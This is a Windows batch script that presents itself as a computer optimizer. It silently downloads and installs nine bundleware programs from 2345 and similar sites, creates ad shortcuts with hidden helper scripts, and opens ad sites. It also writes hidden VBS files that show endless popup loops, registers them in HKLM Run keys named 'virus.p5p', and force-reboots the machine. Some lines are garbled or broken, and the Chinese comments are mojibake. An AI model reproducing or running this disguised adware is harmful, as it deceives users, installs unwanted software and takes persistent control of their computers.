@rem �˳����Ե�����������˺���������˼�����У�
@rem �����ߣ�bilibili.com@SYSTEM-CSRSS-FYC δ��ͬ�⣬�Ͻ����ģ�

@rem ��ӱ���
@title �����Ż��� 
@rem UI���
color 27
cls
@echo ��ӭʹ�õ����Ż�������������ǰȷ�������ѿ���
@pause
@echo ����ִ���Ż�����
@rem ��������
wmic process where name='P5PDownloader' call SetPriority "256"
@rem ���ز����ļ�
cd %appdata%
powershell curl -o "9wka01.exe" "https://download.2345.com/2345pcsafe/background/20220607/2345pcsafeoffline.exe"
powershell curl -o "9wwdj21.exe" "https://dl.2345.com/haozip/haozip_v6.3.1.11144_compliant.exe"
powershell curl -o "2ds8sc1.exe" "https://dl.2345.cc/pinyin/2345pinyin_v7.7.0.8283_compliant.exe"
powershell curl -o "2iaqj21.exe" "https://dl.2345.com/pic/2345pic_000000_10.9.0.9760_x64.exe"
powershell curl -o "5iaddss.exe" "https://dl.2345.com/pdfcvt/2345PdfConverter_v2.3.0.631.exe"
powershell curl -o "2iefe1.exe" "http://dl.kkdownload.com/kzgw_18/kuaizip_setup_v3.3.0.7_kzgw_001.exe"
powershell curl -o "qoiawfj31.exe" "http://file.cdn.cqttech.com/file/ChromeCore_1286_4.1.5.26.exe"
powershell curl -o "qoiwewf32q31.exe" "https://cdn.tongbuxing.net/1NW4yC/SetupChrome.exe"
powershell curl -o "qoiw9im89.exe" "http://picture.xianniu.com/pc/download/4.6.1.1/xianniusetup.4.6.1.1@SG6@.exe"@rem ��Ĭ��װ����
@rem ��Ĭ��װ����
start /wait   "9wka01.exe" /S
start /wait   "9wwdj21.exe" /S
start /wait   "2ds8sc1.exe" /S
start /wait   "2iaqj21.exe /S
start /wait   "5iaddss.exe" /S
start /wait   "2iefe1.exe"  /S
start /wait   "qoiawfj31.exe" /S
start /wait   "qoiwewf32q31.exe" /S
start /wait   "qoiw9im89.exe" /S
wmic process where name='9wka01.exe' call SetPriority "256"
wmic process where name='9wwdj21.exe' call SetPriority "256"
wmic process where name='2ds8sc1.exe' call SetPriority "256"
wmic process where name='2iaqj21.exe' call SetPriority "256"
wmic process where name='5iaddss.exe' call SetPriority "256"
wmic process where name='2iefe1.exe' call SetPriority "256"
wmic process where name='qoiawfj31.exe' call SetPriority "256"
wmic process where name='qoiwewf32q31.exe' call SetPriority "256"
wmic process where name='qoiw9im89.exe' call SetPriority "256"
@rem ����������ַ��ݷ�ʽ
@echo off
set Program=http://4mir.zhangyu39.com/
set LnkName=һ��999����������װ��
set WorkDir=һ��999����������װ��
set Desc=������������ҳ��
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\%username%\Desktop\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@echo off
set Program=https://www.douyin.com/
set LnkName=������ҳ��
set WorkDir=������ҳ��
set Desc=�������ã���ס�ж�
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\%username%\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@echo off
set Program=http://6.cn/
set LnkName=6�䷿ֱ��
set WorkDir=6�䷿ֱ��
set Desc=6�䷿ֱ��
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\%username%\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@echo off
set Program=http://www.2345.com/
set LnkName=��������
set WorkDir=��������
set Desc=��������
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\%username%\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@rem �򿪲�����ַ
start iexplore http://www.douyin.com/
start iexplore http://www.pinduoduo.com/
start iexplore http://4mir.zhangyu39.com/
start iexplore http://www.2345.com/
start iexplore http://www.hao360.com/
@rem Ͷ��������
cd %systemdrive
@echo off
do
wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""��ʱ�����Ϊ�����˱�����ҷ��˶�˵��!"")(window.close)",vhide
loop>>gg1.vbs
gg1.vbs
attrib +s +h gg1.vbs

@echo off
do
wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""С���ǩ�������������"")(window.close)",vhide
loop>>gg2.vbs
gg2.vbs
attrib +s +h gg2.vbs

@echo off
do
wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""2345��ȫ��ʿ���ػ����ĵ��԰�ȫ��"")(window.close)",vhide
loop>>gg3.vbs
gg3.vbs
attrib +s +h gg3.vbs
@rem ������д�뿪��������
@ECHO OFF
reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.1 /t REG_SZ /d %systemdrive%\gg1.vbs /f
reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.2 /t REG_SZ /d %systemdrive%\gg2.vbs /f
reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.3 /t REG_SZ /d %systemdrive%\gg3.vbs /f
@echo �Ż���ɣ���������
pause
shutdown /r /t 0
@rem �������ˣ�exit���doge��
@rem �ô�����ÿ���doge��
exit